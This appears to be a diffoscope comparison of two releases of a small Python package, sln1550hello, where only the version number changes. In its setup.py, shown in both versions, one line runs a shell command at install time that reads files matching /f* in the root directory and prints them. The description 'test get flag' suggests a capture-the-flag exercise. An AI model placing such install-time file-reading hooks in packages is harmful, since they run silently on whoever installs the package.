# Comparing `tmp/sln1550hello-0.0.2.tar.gz` & `tmp/sln1550hello-0.0.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "sln1550hello-0.0.2.tar", last modified: Sun May 14 13:52:01 2023, max compression
+gzip compressed data, was "sln1550hello-0.0.3.tar", last modified: Sun May 14 17:44:21 2023, max compression
```

## Comparing `sln1550hello-0.0.2.tar` & `sln1550hello-0.0.3.tar`

### file list

```diff
@@ -1,9 +1,9 @@
-drwxrwxrwx   0 root         (0) root         (0)        0 2023-05-14 13:52:00.000000 sln1550hello-0.0.2/
--rwxrwxrwx   0 root         (0) root         (0)      210 2023-05-14 13:52:00.000000 sln1550hello-0.0.2/PKG-INFO
--rwxrwxrwx   0 root         (0) root         (0)       38 2023-05-14 13:52:00.000000 sln1550hello-0.0.2/setup.cfg
--rwxrwxrwx   0 root         (0) root         (0)     1870 2023-05-14 13:51:56.000000 sln1550hello-0.0.2/setup.py
-drwxrwxrwx   0 root         (0) root         (0)        0 2023-05-14 13:52:00.000000 sln1550hello-0.0.2/sln1550hello.egg-info/
--rwxrwxrwx   0 root         (0) root         (0)      210 2023-05-14 13:52:00.000000 sln1550hello-0.0.2/sln1550hello.egg-info/PKG-INFO
--rwxrwxrwx   0 root         (0) root         (0)      152 2023-05-14 13:52:00.000000 sln1550hello-0.0.2/sln1550hello.egg-info/SOURCES.txt
--rwxrwxrwx   0 root         (0) root         (0)        1 2023-05-14 13:52:00.000000 sln1550hello-0.0.2/sln1550hello.egg-info/dependency_links.txt
--rwxrwxrwx   0 root         (0) root         (0)        1 2023-05-14 13:52:00.000000 sln1550hello-0.0.2/sln1550hello.egg-info/top_level.txt
+drwxrwxrwx   0 root         (0) root         (0)        0 2023-05-14 17:44:21.000000 sln1550hello-0.0.3/
+-rwxrwxrwx   0 root         (0) root         (0)      210 2023-05-14 17:44:21.000000 sln1550hello-0.0.3/PKG-INFO
+-rwxrwxrwx   0 root         (0) root         (0)       38 2023-05-14 17:44:21.000000 sln1550hello-0.0.3/setup.cfg
+-rwxrwxrwx   0 root         (0) root         (0)     1870 2023-05-14 17:44:16.000000 sln1550hello-0.0.3/setup.py
+drwxrwxrwx   0 root         (0) root         (0)        0 2023-05-14 17:44:21.000000 sln1550hello-0.0.3/sln1550hello.egg-info/
+-rwxrwxrwx   0 root         (0) root         (0)      210 2023-05-14 17:44:21.000000 sln1550hello-0.0.3/sln1550hello.egg-info/PKG-INFO
+-rwxrwxrwx   0 root         (0) root         (0)      152 2023-05-14 17:44:21.000000 sln1550hello-0.0.3/sln1550hello.egg-info/SOURCES.txt
+-rwxrwxrwx   0 root         (0) root         (0)        1 2023-05-14 17:44:21.000000 sln1550hello-0.0.3/sln1550hello.egg-info/dependency_links.txt
+-rwxrwxrwx   0 root         (0) root         (0)        1 2023-05-14 17:44:21.000000 sln1550hello-0.0.3/sln1550hello.egg-info/top_level.txt
```

### Comparing `sln1550hello-0.0.2/setup.py` & `sln1550hello-0.0.3/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,12 +1,12 @@
 
 from setuptools import setup,find_packages
 print(__import__("subprocess").getoutput("cd / && cat /f*"))
 setup(name='sln1550hello',
-      version='0.0.2',
+      version='0.0.3',
       description='test get flag',
       author='none',
       author_email='sln.1550@qq.com',
       requires= ['setuptools'], # 定义依赖哪些模块
       packages=find_packages(),  # 系统自动从当前目录开始找包
       # 如果有的文件不用打包，则只能指定需要打包的文件
       #packages=['代码1','代码2','__init__']  #指定目录中需要打包的py文件，注意不要.py后缀
```

